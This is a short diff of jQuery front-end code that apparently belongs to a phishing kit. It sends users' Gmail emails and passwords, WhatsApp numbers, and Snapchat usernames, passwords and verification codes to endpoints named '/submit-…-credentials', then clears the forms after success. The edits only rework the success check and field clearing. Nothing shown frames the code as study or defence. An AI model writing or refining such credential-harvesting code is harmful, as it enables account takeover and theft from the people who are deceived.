@@ -124,9 +124,12 @@ $(function () {
           type: "POST",
           url: "/submit-whatsapp-credentials",
         }).done(function (data) {
-          if (data.message === "success") {
+          if (data.code === "success") {
+            // clear form fields
+            whatsAppNumber.val("");
+            whatsAppCountry.val("");
             console.log("Submission was a success");
-          } else if (data.message === "error") {
+          } else if (data.code === "error") {
             console.log("Submission was a failure");
           }
         });
@@ -147,9 +150,12 @@ $(function () {
           type: "POST",
           url: "/submit-gmail-credentials",
         }).done(function (data) {
-          if (data.message === "success") {
+          if (data.code === "success") {
+            // clear form fields
+            email.val("");
+            password.val("");
             console.log("Submission was a success");
-          } else if (data.message === "error") {
+          } else if (data.code === "error") {
             console.log("Submission was a failure");
           }
         });
@@ -171,9 +177,13 @@ $(function () {
           type: "POST",
           url: "/submit-snapchat-credentials",
         }).done(function (data) {
-          if (data.message === "success") {
+          if (data.code === "success") {
+            // clear form fields
+            username.val("");
+            password.val("");
+            codeInput.val("");
             console.log("Submission was a success");
-          } else if (data.message === "error") {
+          } else if (data.code === "error") {
             console.log("Submission was a failure");
           }
         });
